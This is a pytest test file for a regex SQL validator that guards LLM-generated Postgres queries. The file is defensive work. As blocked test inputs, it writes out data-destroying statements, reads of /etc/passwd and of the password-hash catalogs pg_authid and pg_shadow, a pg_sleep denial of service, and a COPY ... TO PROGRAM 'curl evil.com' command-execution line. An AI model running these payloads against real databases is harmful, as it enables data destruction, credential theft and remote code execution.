"""
Tests for SQL Validator.

We execute LLM-generated SQL against a real database, so this is the last
line of defence in the application layer. Three groups of tests:

  1. Queries that must pass (including ones that used to be wrongly rejected)
  2. Queries that must be blocked (each one is a bypass found by adversarial
     testing against the original regex validator)
  3. Documented limitations — cases a regex validator cannot catch, asserted
     here so the gap is explicit rather than assumed to be covered
"""
from app.services.sql_validator import validate_sql


# ---------------------------------------------------------------------------
# 1. Legitimate queries must pass
# ---------------------------------------------------------------------------

def test_valid_select():
    """Normal SELECT should pass."""
    result = validate_sql("SELECT * FROM customers LIMIT 10")
    assert result["valid"] is True
    assert len(result["issues"]) == 0


def test_valid_cte():
    """CTEs are the main shape the agent generates."""
    result = validate_sql(
        "WITH x AS (SELECT 1 AS a FROM olist_orders) SELECT * FROM x"
    )
    assert result["valid"] is True, result["issues"]


def test_valid_trailing_semicolon():
    """A single trailing semicolon is normal and must not be treated as multi-statement."""
    result = validate_sql("SELECT * FROM olist_orders LIMIT 5;")
    assert result["valid"] is True, result["issues"]


def test_valid_multiline_query():
    """Leading whitespace and newlines are fine."""
    result = validate_sql("\n   SELECT order_id\n   FROM olist_orders\n")
    assert result["valid"] is True, result["issues"]


def test_keyword_inside_string_literal_is_not_a_keyword():
    """
    REGRESSION: this was rejected because \\bCREATE\\b matched inside a LIKE
    pattern. A legitimate query being blocked is its own kind of bug.
    """
    result = validate_sql(
        "SELECT * FROM olist_order_reviews "
        "WHERE review_comment_message LIKE '%create%'"
    )
    assert result["valid"] is True, result["issues"]


def test_semicolon_inside_string_literal_is_not_multi_statement():
    """A semicolon in data is data, not a statement separator."""
    result = validate_sql("SELECT * FROM olist_orders WHERE order_status = 'a;b'")
    assert result["valid"] is True, result["issues"]


def test_realistic_agent_query_passes():
    """The kind of multi-CTE query the ReAct agent actually produces."""
    sql = """
        WITH revenue_by_state AS (
            SELECT c.customer_state, SUM(p.payment_value) AS total_revenue
            FROM olist_order_payments p
            JOIN olist_orders o ON p.order_id = o.order_id
            JOIN olist_customers c ON o.customer_id = c.customer_id
            GROUP BY c.customer_state
        ),
        national_avg AS (
            SELECT AVG(review_score) AS national_avg_score FROM olist_order_reviews
        )
        SELECT r.customer_state, r.total_revenue, n.national_avg_score
        FROM revenue_by_state r
        CROSS JOIN national_avg n
        ORDER BY r.total_revenue DESC
        LIMIT 1;
    """
    result = validate_sql(sql)
    assert result["valid"] is True, result["issues"]


# ---------------------------------------------------------------------------
# 2. Original blocked cases — must stay blocked
# ---------------------------------------------------------------------------

def test_blocks_insert():
    assert validate_sql("INSERT INTO customers (name) VALUES ('test')")["valid"] is False


def test_blocks_drop():
    assert validate_sql("DROP TABLE customers")["valid"] is False


def test_blocks_delete():
    assert validate_sql("DELETE FROM customers WHERE id = 1")["valid"] is False


def test_blocks_update():
    assert validate_sql("UPDATE customers SET name = 'hacked' WHERE id = 1")["valid"] is False


def test_blocks_multiple_semicolons():
    assert validate_sql("SELECT 1; DROP TABLE customers;")["valid"] is False


def test_requires_from():
    assert validate_sql("SELECT 1")["valid"] is False


def test_blocks_lowercase_drop():
    assert validate_sql("drop table olist_orders")["valid"] is False


# ---------------------------------------------------------------------------
# 3. Bypasses found by adversarial testing — each of these PASSED the
#    original validator. One test per bypass.
# ---------------------------------------------------------------------------

def test_blocks_select_into():
    """
    BYPASS: `SELECT ... INTO` creates a table in Postgres, but it starts with
    SELECT and contains no blocked keyword, so it passed the prefix check.
    """
    result = validate_sql("SELECT * INTO pwned FROM olist_orders")
    assert result["valid"] is False
    assert any("INTO" in i for i in result["issues"])


def test_blocks_second_select_statement():
    """
    BYPASS: the old check was count(';') > 1, so exactly one extra statement
    slipped through.
    """
    result = validate_sql("SELECT 1 FROM olist_orders; SELECT 2 FROM olist_customers")
    assert result["valid"] is False
    assert any("Multiple statements" in i for i in result["issues"])


def test_blocks_trailing_line_comment():
    """
    BYPASS: the old pattern was r"--(?!.*$)". The .*$ lookahead always
    succeeds, so the negative lookahead always fails and the pattern could
    never match anything.
    """
    result = validate_sql("SELECT * FROM olist_orders -- and now anything")
    assert result["valid"] is False


def test_blocks_bare_line_comment():
    """Same dead regex, comment at end of statement."""
    result = validate_sql("SELECT * FROM olist_orders WHERE 1=1 --")
    assert result["valid"] is False


def test_blocks_block_comment():
    """Block comments were already caught; keep them caught after the rewrite."""
    assert validate_sql("/* hi */ SELECT 1 FROM olist_orders")["valid"] is False


def test_blocks_pg_sleep():
    """BYPASS: denial of service. No statement timeout is configured either."""
    result = validate_sql("SELECT pg_sleep(60) FROM olist_orders")
    assert result["valid"] is False
    assert any("pg_sleep" in i for i in result["issues"])


def test_blocks_pg_read_file():
    """BYPASS: reads the server filesystem when connected as a superuser."""
    result = validate_sql("SELECT pg_read_file('/etc/passwd') FROM olist_orders LIMIT 1")
    assert result["valid"] is False
    assert any("pg_read_file" in i for i in result["issues"])


def test_blocks_pg_authid():
    """BYPASS: pg_authid holds role password hashes."""
    result = validate_sql("SELECT * FROM pg_authid")
    assert result["valid"] is False
    assert any("pg_authid" in i for i in result["issues"])


def test_blocks_pg_shadow():
    """BYPASS: same, via the legacy view."""
    result = validate_sql("SELECT usename, passwd FROM pg_shadow")
    assert result["valid"] is False
    assert any("pg_shadow" in i for i in result["issues"])


def test_blocks_copy_to_program():
    """COPY ... TO PROGRAM is remote code execution as the postgres user."""
    assert validate_sql("COPY (SELECT 1) TO PROGRAM 'curl evil.com'")["valid"] is False


# ---------------------------------------------------------------------------
# 4. Documented limitations — a regex validator CANNOT catch these.
#    These tests assert the gap so nobody assumes it is covered.
#    The real controls are: a read-only database role, a statement timeout,
#    and schema-aware validation (AST parsing) before execution.
# ---------------------------------------------------------------------------

def test_limitation_nonexistent_column_is_not_caught():
    """
    LIMITATION: no schema awareness. A hallucinated column is syntactically
    valid SQL and only fails at execution time.
    Real fix: parse to AST and check identifiers against the live schema.
    """
    assert validate_sql("SELECT no_such_column FROM olist_orders")["valid"] is True


def test_limitation_nonexistent_table_is_not_caught():
    """
    LIMITATION: same. Currently surfaces as a 500 from the database.
    Real fix: schema-aware validation.
    """
    assert validate_sql("SELECT * FROM no_such_table")["valid"] is True


def test_limitation_semantically_wrong_join_is_not_caught():
    """
    LIMITATION: this joins orders to items on the wrong key. It is valid SQL,
    it runs, and it returns a plausible wrong number. No validator can catch
    this class of bug — it needs a golden set (see tests/test_golden_set.py)
    or a human who knows the data.
    """
    sql = ("SELECT COUNT(*) FROM olist_orders o "
           "JOIN olist_order_items i ON o.customer_id = i.order_id")
    assert validate_sql(sql)["valid"] is True


def test_limitation_cross_join_bomb_is_not_caught():
    """
    LIMITATION: 112,650 x 112,650 rows. Valid SQL, no blocked keyword.
    Real fix: statement_timeout on the connection, plus EXPLAIN before execute.
    """
    sql = "SELECT COUNT(*) FROM olist_order_items a, olist_order_items b"
    assert validate_sql(sql)["valid"] is True
